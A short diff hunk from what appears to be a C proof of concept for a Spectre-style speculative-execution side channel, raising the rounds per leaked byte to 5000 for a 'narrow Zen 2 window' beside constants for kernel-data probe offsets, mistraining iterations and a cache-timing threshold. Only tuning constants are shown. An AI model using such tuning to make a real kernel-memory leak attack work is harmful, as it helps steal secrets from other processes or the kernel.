@@ -74,7 +74,7 @@
 #define PROBE_OFFSET     0x4000000    /* 64MB into kdata */
 #define PAGE_STRIDE      4096
 #define TRAIN_ARRAY_SZ   16
-#define NROUNDS          500          /* rounds per byte (up from 200) */
+#define NROUNDS          5000         /* rounds per byte (need many for narrow Zen 2 window) */
 #define TRAIN_ITERS      30           /* 29 training + 1 attack per group */
 #define CACHE_THRESHOLD  300          /* cycles: raised from 80 */
 
